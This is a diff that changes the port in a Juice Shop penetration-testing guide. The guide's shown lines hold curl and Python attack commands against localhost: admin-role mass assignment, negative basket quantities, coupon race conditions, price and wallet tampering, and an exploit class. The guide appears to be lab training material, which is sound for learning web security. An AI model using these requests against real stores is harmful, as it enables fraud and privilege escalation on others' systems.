@@ -6,20 +6,20 @@
 
 ```bash
 # Swagger/OpenAPI endpoints
-curl http://localhost:3000/api-docs
-curl http://localhost:3000/api-docs/swagger.json
-curl http://localhost:3000/swagger.json
+curl http://localhost:8000/api-docs
+curl http://localhost:8000/api-docs/swagger.json
+curl http://localhost:8000/swagger.json
 
 # The Swagger UI is available at:
-# http://localhost:3000/api-docs
+# http://localhost:8000/api-docs
 ```
 
 ### API Endpoints Discovered:
 
 ```bash
 # Extract from JavaScript
-curl -s http://localhost:3000/main.js | grep -oE '/api/[^"]*' | sort -u
-curl -s http://localhost:3000/main.js | grep -oE '/rest/[^"]*' | sort -u
+curl -s http://localhost:8000/main.js | grep -oE '/api/[^"]*' | sort -u
+curl -s http://localhost:8000/main.js | grep -oE '/rest/[^"]*' | sort -u
 ```
 
 **Complete API Map:**
@@ -49,7 +49,7 @@ curl -s http://localhost:3000/main.js | grep -oE '/rest/[^"]*' | sort -u
 
 ```bash
 # Normal registration
-curl -X POST http://localhost:3000/api/Users \
+curl -X POST http://localhost:8000/api/Users \
   -H "Content-Type: application/json" \
   -d '{
     "email": "test@test.com",
@@ -61,7 +61,7 @@ curl -X POST http://localhost:3000/api/Users \
 
 ```bash
 # Try to assign admin role during registration
-curl -X POST http://localhost:3000/api/Users \
+curl -X POST http://localhost:8000/api/Users \
   -H "Content-Type: application/json" \
   -d '{
     "email": "hacker@test.com",
@@ -71,7 +71,7 @@ curl -X POST http://localhost:3000/api/Users \
   }'
 
 # Try to set deluxe token
-curl -X POST http://localhost:3000/api/Users \
+curl -X POST http://localhost:8000/api/Users \
   -H "Content-Type: application/json" \
   -d '{
     "email": "deluxe@test.com", 
@@ -86,7 +86,7 @@ curl -X POST http://localhost:3000/api/Users \
 TOKEN="your-jwt-token"
 
 # Update user with additional fields
-curl -X PUT http://localhost:3000/api/Users/21 \
+curl -X PUT http://localhost:8000/api/Users/21 \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
@@ -113,7 +113,7 @@ curl -X PUT http://localhost:3000/api/Users/21 \
 TOKEN="your-jwt-token"
 
 # Add item with negative quantity (credit instead of charge)
-curl -X POST http://localhost:3000/api/BasketItems \
+curl -X POST http://localhost:8000/api/BasketItems \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
@@ -123,7 +123,7 @@ curl -X POST http://localhost:3000/api/BasketItems \
   }'
 
 # Update existing item to negative
-curl -X PUT http://localhost:3000/api/BasketItems/1 \
+curl -X PUT http://localhost:8000/api/BasketItems/1 \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
@@ -138,12 +138,12 @@ curl -X PUT http://localhost:3000/api/BasketItems/1 \
 # Format: MNEMONIC-MMYY (month/year of validity)
 
 # Apply coupon
-curl -X PUT "http://localhost:3000/rest/basket/1/coupon/WMNSDY2019" \
+curl -X PUT "http://localhost:8000/rest/basket/1/coupon/WMNSDY2019" \
   -H "Authorization: Bearer $TOKEN"
 
 # Try to apply multiple times (race condition)
 for i in {1..10}; do
-  curl -X PUT "http://localhost:3000/rest/basket/1/coupon/WMNSDY2019" \
+  curl -X PUT "http://localhost:8000/rest/basket/1/coupon/WMNSDY2019" \
     -H "Authorization: Bearer $TOKEN" &
 done
 wait
@@ -153,7 +153,7 @@ wait
 
 ```bash
 # If price modification is possible in requests
-curl -X PUT http://localhost:3000/api/Products/1 \
+curl -X PUT http://localhost:8000/api/Products/1 \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
@@ -165,7 +165,7 @@ curl -X PUT http://localhost:3000/api/Products/1 \
 
 ```bash
 # Create feedback with manipulated rating
-curl -X POST http://localhost:3000/api/Feedbacks \
+curl -X POST http://localhost:8000/api/Feedbacks \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
@@ -188,7 +188,7 @@ COUPON="WMNSDY2019"
 BASKET_ID="1"
 
 for i in {1..20}; do
-  curl -s -X PUT "http://localhost:3000/rest/basket/$BASKET_ID/coupon/$COUPON" \
+  curl -s -X PUT "http://localhost:8000/rest/basket/$BASKET_ID/coupon/$COUPON" \
     -H "Authorization: Bearer $TOKEN" \
     -o /dev/null &
 done
@@ -204,7 +204,7 @@ echo "Race condition test complete"
 import requests
 import threading
 
-URL = "http://localhost:3000/rest/basket/1/coupon/WMNSDY2019"
+URL = "http://localhost:8000/rest/basket/1/coupon/WMNSDY2019"
 HEADERS = {"Authorization": "Bearer your-token"}
 THREADS = 20
 
@@ -230,7 +230,7 @@ for t in threads:
 
 ```bash
 # Add to wallet with negative amount (if vulnerable)
-curl -X POST http://localhost:3000/rest/wallet/balance \
+curl -X POST http://localhost:8000/rest/wallet/balance \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
@@ -238,7 +238,7 @@ curl -X POST http://localhost:3000/rest/wallet/balance \
   }'
 
 # Complete payment with modified amount
-curl -X POST http://localhost:3000/rest/basket/1/checkout \
+curl -X POST http://localhost:8000/rest/basket/1/checkout \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
@@ -290,7 +290,7 @@ Business Logic Flaws:
 
 import requests
 
-BASE = "http://localhost:3000"
+BASE = "http://localhost:8000"
 
 class JuiceShopExploit:
     def __init__(self):
